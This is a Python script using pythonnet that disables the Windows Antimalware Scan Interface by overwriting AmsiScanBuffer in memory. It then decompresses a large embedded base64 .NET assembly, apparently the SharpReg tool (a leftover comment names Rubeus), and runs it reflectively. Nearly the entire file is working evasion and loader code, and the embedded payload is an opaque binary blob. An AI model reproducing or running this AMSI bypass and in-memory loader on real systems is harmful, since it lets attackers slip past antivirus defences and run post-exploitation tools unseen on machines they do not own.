import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpReg.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    if method == None:
        method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        print(method)
    # Convert your command to a .NET string array
    command_args = Array[str](command)

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()